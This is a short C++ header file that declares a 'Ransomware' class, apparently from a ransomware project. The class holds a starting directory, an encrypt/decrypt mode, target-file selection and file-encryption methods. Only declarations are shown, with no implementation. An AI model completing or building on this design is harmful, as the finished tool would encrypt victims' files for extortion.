#pragma once

#include "Crypt.h"
#include "FileEncryptionDecision.h"

class Ransomware
{
private:
	const std::string m_startingDirectory;
public:
	enum RansomwareOperation { Encrypt = 1, Decrypt };
	RansomwareOperation m_ransomwareOperation;
private:
	FileEncryptionDecisions m_fileEncryptionDecisions;
	Crypt crypt;

public:
	Ransomware(const std::string& startingDirectory, RansomwareOperation ransomwareOperation);
	long Start();

private:
	bool IsTargetFile(const std::string& filePath);
	void CryptFile(const std::string& filePath);
};